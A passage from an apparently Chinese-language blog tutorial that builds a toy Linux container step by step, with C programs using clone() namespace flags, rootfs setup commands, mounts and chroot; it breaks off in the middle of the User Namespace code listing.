<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 定义一个给 clone 用的栈，栈大小1M */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STACK_SIZE (1024 * 1024)</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> container_stack[STACK_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* <span class="keyword">const</span> container_args[] = &#123;</span><br><span class="line">    <span class="string">&quot;/bin/bash&quot;</span>,</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">container_main</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Container - inside the container!\n&quot;</span>);</span><br><span class="line">    sethostname(<span class="string">&quot;container&quot;</span>,<span class="number">10</span>); <span class="comment">/* 设置hostname */</span></span><br><span class="line">    execv(container_args[<span class="number">0</span>], container_args);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Something&#x27;s wrong!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parent - start a container!\n&quot;</span>);</span><br><span class="line">    <span class="comment">/* 调用clone函数，其中传出一个函数，还有一个栈空间的（为什么传尾指针，因为栈是反着的） */</span></span><br><span class="line">    <span class="keyword">int</span> container_pid = clone(container_main, container_stack+STACK_SIZE, SIGCHLD | CLONE_NEWUTS | CLONE_NEWIPC, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">/* 等待子进程结束 */</span></span><br><span class="line">    waitpid(container_pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parent - container stopped!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>ipcmk -Q</code> 创建一个进程通信消息队列，通过 <code>ipcs -q</code> 查看新建的队列。<br>运行进程间通信隔离程序，子进程内运行 <code>ipcs -q</code> 看不到新建的队列</p>
<h3 id="PID-Namespace"><a href="#PID-Namespace" class="headerlink" title="PID Namespace"></a>PID Namespace</h3><p>可通过 clone() 函数设置 <code>CLONE_NEWPID</code> 标志位实现，需要 root 权限</p>
<p>pid_ns.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 定义一个给 clone 用的栈，栈大小1M */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STACK_SIZE (1024 * 1024)</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> container_stack[STACK_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* <span class="keyword">const</span> container_args[] = &#123;</span><br><span class="line">    <span class="string">&quot;/bin/bash&quot;</span>,</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">container_main</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Container [%5d] - inside the container!\n&quot;</span>, getpid());</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Container - inside the container!\n&quot;</span>);</span><br><span class="line">    sethostname(<span class="string">&quot;container&quot;</span>,<span class="number">10</span>); <span class="comment">/* 设置hostname */</span></span><br><span class="line">    execv(container_args[<span class="number">0</span>], container_args);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Something&#x27;s wrong!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parent - start a container!\n&quot;</span>);</span><br><span class="line">    <span class="comment">/* 调用clone函数，其中传出一个函数，还有一个栈空间的（为什么传尾指针，因为栈是反着的） */</span></span><br><span class="line">    <span class="keyword">int</span> container_pid = clone(container_main, container_stack+STACK_SIZE, SIGCHLD | CLONE_NEWUTS | CLONE_NEWIPC | CLONE_NEWPID, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">/* 等待子进程结束 */</span></span><br><span class="line">    waitpid(container_pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parent - container stopped!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运行进程隔离程序会发现我们程序的pid为1，pid为1是特殊的进程，在表1介绍中有列举一些特殊性<br>这里直接 ps 会发现只有当前子进程的进程号，但通过 <code>ps -ef</code> 或者 <code>top</code> 命令会查看到所有进程号，这里是因为 <code>ps -ef</code> 会读取 <code>/proc</code> 文件系统，这里还未对此文件系统进行隔离</p>
<h3 id="MNT-Namespace"><a href="#MNT-Namespace" class="headerlink" title="MNT Namespace"></a>MNT Namespace</h3><p>可通过 clone() 函数设置 <code>CLONE_NEWNS</code> 标志位实现，需要 root 权限</p>
<p>mnt_ns.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 定义一个给 clone 用的栈，栈大小1M */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STACK_SIZE (1024 * 1024)</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> container_stack[STACK_SIZE];</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* <span class="keyword">const</span> container_args[] = &#123;</span><br><span class="line">    <span class="string">&quot;/bin/bash&quot;</span>,</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">container_main</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Container [%5d] - inside the container!\n&quot;</span>, getpid());</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Container - inside the container!\n&quot;</span>);</span><br><span class="line">    sethostname(<span class="string">&quot;container&quot;</span>,<span class="number">10</span>); <span class="comment">/* 设置hostname */</span></span><br><span class="line">    system(<span class="string">&quot;mount -t proc proc /proc&quot;</span>);</span><br><span class="line">    execv(container_args[<span class="number">0</span>], container_args);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Something&#x27;s wrong!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parent - start a container!\n&quot;</span>);</span><br><span class="line">    <span class="comment">/* 调用clone函数，其中传出一个函数，还有一个栈空间的（为什么传尾指针，因为栈是反着的） */</span></span><br><span class="line">    <span class="keyword">int</span> container_pid = clone(container_main, container_stack+STACK_SIZE, SIGCHLD | CLONE_NEWUTS | CLONE_NEWIPC | CLONE_NEWPID | CLONE_NEWNS, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="comment">/* 等待子进程结束 */</span></span><br><span class="line">    waitpid(container_pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parent - container stopped!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里对 <code>/proc</code> 文件系统进行了隔离，此时在 <code>ps -ef</code> 或者 <code>top</code> 看到的也只有当前进程的进程号了，注意此程序会覆盖父进程的 <code>/proc</code> 系统，子进程退出后要通过 <code>umount</code> 或者 <code>mount -t proc proc /proc</code><br>当然除了 /proc 还有 /dev、/sys、/tmp、/run 等</p>
<h3 id="一个玩具容器"><a href="#一个玩具容器" class="headerlink" title="一个玩具容器"></a>一个玩具容器</h3><p>先创建一个 rootfs</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p rootfs/&#123;bin,dev,etc,home,lib/x86_64-linux-gnu,lib64,mnt,opt,proc,root,run,sbin,sys,tmp,usr/bin,var&#125;</span><br></pre></td></tr></table></figure>

<p>其中 <code>lib/x86_64-linux-gnu</code> 根据 <code>ldd</code> /bin 目录下各个命令结果的动态链接库来，我这里分别是</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/bin/sh /usr/bin/ls /usr/bin/mount /usr/bin/cat /usr/bin/ps rootfs/usr/bin/</span><br><span class="line">cp /etc/hosts /etc/hostname /etc/resolv.conf rootfs/etc</span><br><span class="line">cp /lib/x86_64-linux-gnu/libc.so.6 rootfs/lib/x86_64-linux-gnu/</span><br><span class="line">cp /lib64/ld-linux-x86-64.so.2 rootfs/lib64</span><br><span class="line">cp /lib/x86_64-linux-gnu/libselinux.so.1 rootfs/lib/x86_64-linux-gnu/libselinux.so.1</span><br><span class="line">cp /lib/x86_64-linux-gnu/libpcre2-8.so.0 rootfs/lib/x86_64-linux-gnu/libpcre2-8.so.0</span><br><span class="line">cp /lib/x86_64-linux-gnu/libdl.so.2 rootfs/lib/x86_64-linux-gnu/libdl.so.2</span><br><span class="line">cp /lib64/ld-linux-x86-64.so.2 rootfs/lib64/ld-linux-x86-64.so.2</span><br><span class="line">cp /lib/x86_64-linux-gnu/libpthread.so.0 rootfs/lib/x86_64-linux-gnu/libpthread.so.0</span><br><span class="line">cp /lib/x86_64-linux-gnu/libmount.so.1 rootfs/lib/x86_64-linux-gnu/libmount.so.1</span><br><span class="line">cp /lib/x86_64-linux-gnu/libblkid.so.1 rootfs/lib/x86_64-linux-gnu/libblkid.so.1</span><br><span class="line">cp /lib/x86_64-linux-gnu/libselinux.so.1 rootfs/lib/x86_64-linux-gnu/libselinux.so.1</span><br><span class="line">cp /lib/x86_64-linux-gnu/libprocps.so.8 rootfs/lib/x86_64-linux-gnu/libprocps.so.8</span><br><span class="line">cp /lib/x86_64-linux-gnu/libsystemd.so.0 rootfs/lib/x86_64-linux-gnu/libsystemd.so.0</span><br><span class="line">cp /lib/x86_64-linux-gnu/librt.so.1 rootfs/lib/x86_64-linux-gnu/librt.so.1</span><br><span class="line">cp /lib/x86_64-linux-gnu/liblzma.so.5 rootfs/lib/x86_64-linux-gnu/liblzma.so.5</span><br><span class="line">cp /lib/x86_64-linux-gnu/libzstd.so.1 rootfs/lib/x86_64-linux-gnu/libzstd.so.1</span><br><span class="line">cp /lib/x86_64-linux-gnu/liblz4.so.1 rootfs/lib/x86_64-linux-gnu/liblz4.so.1</span><br><span class="line">cp /lib/x86_64-linux-gnu/libgcrypt.so.20 rootfs/lib/x86_64-linux-gnu/libgcrypt.so.20</span><br><span class="line">cp /lib/x86_64-linux-gnu/libgpg-error.so.0 rootfs/lib/x86_64-linux-gnu/libgpg-error.so.0</span><br></pre></td></tr></table></figure>

<p><code>chroot rootfs</code> 改变根目录, 进入至新的文件系统里了，但是现在一些命名空间还没做隔离，加上上面的clone函数标志位</p>
<p>container.c</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mount.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STACK_SIZE (1024 * 1024)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">char</span> container_stack[STACK_SIZE];</span><br><span class="line"><span class="keyword">char</span>* <span class="keyword">const</span> container_args[] = &#123;</span><br><span class="line">    <span class="string">&quot;/usr/bin/sh&quot;</span>,</span><br><span class="line">    <span class="string">&quot;-l&quot;</span>,</span><br><span class="line">    <span class="literal">NULL</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">container_main</span><span class="params">(<span class="keyword">void</span>* arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Container [%5d] - inside the container!\n&quot;</span>, getpid());</span><br><span class="line"></span><br><span class="line">    <span class="comment">//set hostname</span></span><br><span class="line">    sethostname(<span class="string">&quot;container&quot;</span>,<span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//remount &quot;/proc&quot; to make sure the &quot;top&quot; and &quot;ps&quot; show container&#x27;s information</span></span><br><span class="line">    <span class="keyword">if</span> (mount(<span class="string">&quot;proc&quot;</span>, <span class="string">&quot;rootfs/proc&quot;</span>, <span class="string">&quot;proc&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>) !=<span class="number">0</span> ) &#123;</span><br><span class="line">        perror(<span class="string">&quot;proc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (mount(<span class="string">&quot;sysfs&quot;</span>, <span class="string">&quot;rootfs/sys&quot;</span>, <span class="string">&quot;sysfs&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>)!=<span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;sys&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (mount(<span class="string">&quot;none&quot;</span>, <span class="string">&quot;rootfs/tmp&quot;</span>, <span class="string">&quot;tmpfs&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>)!=<span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;tmp&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (mount(<span class="string">&quot;udev&quot;</span>, <span class="string">&quot;rootfs/dev&quot;</span>, <span class="string">&quot;devtmpfs&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>)!=<span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;dev&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (mount(<span class="string">&quot;devpts&quot;</span>, <span class="string">&quot;rootfs/dev/pts&quot;</span>, <span class="string">&quot;devpts&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>)!=<span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;dev/pts&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (mount(<span class="string">&quot;shm&quot;</span>, <span class="string">&quot;rootfs/dev/shm&quot;</span>, <span class="string">&quot;tmpfs&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>)!=<span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;dev/shm&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (mount(<span class="string">&quot;tmpfs&quot;</span>, <span class="string">&quot;rootfs/run&quot;</span>, <span class="string">&quot;tmpfs&quot;</span>, <span class="number">0</span>, <span class="literal">NULL</span>)!=<span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;run&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 模仿Docker的从外向容器里mount相关的配置文件</span></span><br><span class="line"><span class="comment">     * 你可以查看：/var/lib/docker/containers/&lt;container_id&gt;/目录，</span></span><br><span class="line"><span class="comment">     * 你会看到docker的这些文件的。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">if</span> (mount(<span class="string">&quot;conf/hosts&quot;</span>, <span class="string">&quot;rootfs/etc/hosts&quot;</span>, <span class="string">&quot;none&quot;</span>, MS_BIND, <span class="literal">NULL</span>)!=<span class="number">0</span> ||</span><br><span class="line">          mount(<span class="string">&quot;conf/hostname&quot;</span>, <span class="string">&quot;rootfs/etc/hostname&quot;</span>, <span class="string">&quot;none&quot;</span>, MS_BIND, <span class="literal">NULL</span>)!=<span class="number">0</span> ||</span><br><span class="line">          mount(<span class="string">&quot;conf/resolv.conf&quot;</span>, <span class="string">&quot;rootfs/etc/resolv.conf&quot;</span>, <span class="string">&quot;none&quot;</span>, MS_BIND, <span class="literal">NULL</span>)!=<span class="number">0</span> ) &#123;</span><br><span class="line">        perror(<span class="string">&quot;conf&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* chroot 隔离目录 */</span></span><br><span class="line">    <span class="keyword">if</span> ( chdir(<span class="string">&quot;./rootfs&quot;</span>) != <span class="number">0</span> || chroot(<span class="string">&quot;./&quot;</span>) != <span class="number">0</span> )&#123;</span><br><span class="line">        perror(<span class="string">&quot;chdir/chroot&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    execv(container_args[<span class="number">0</span>], container_args);</span><br><span class="line">    perror(<span class="string">&quot;exec&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Something&#x27;s wrong!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parent [%5d] - start a container!\n&quot;</span>, getpid());</span><br><span class="line">    <span class="keyword">int</span> container_pid = clone(container_main, container_stack+STACK_SIZE,</span><br><span class="line">            CLONE_NEWUTS | CLONE_NEWIPC | CLONE_NEWPID | CLONE_NEWNS | SIGCHLD, <span class="literal">NULL</span>);</span><br><span class="line">    waitpid(container_pid, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parent - container stopped!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>做了主机、进程、进程间通信、文件系统(包含 /dev /proc/sys /run /tmp 目录)隔离的代码</p>
<p>运行后悔挂在设备文件至 rootfs/dev 等目录，想要删除 rootfs 需要 <code>umount -R rootfs/dev rootfs/proc rootfs/sys rootfs/run rootfs/tmp rootfs/etc/*</code> 一下</p>
<h3 id="User-Namespace"><a href="#User-Namespace" class="headerlink" title="User Namespace"></a>User Namespace</h3><p>可通过 clone() 函数设置 <code>CLONE_NEWUSER</code> 标志位实现，但不需要 root 权限，通过普通用户运行，安全系数更高，就算被逃逸了也是一个普通用户权限</p>
<p><code>sys/capability.h</code>头文件需要安装依赖</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install libcap-dev</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span 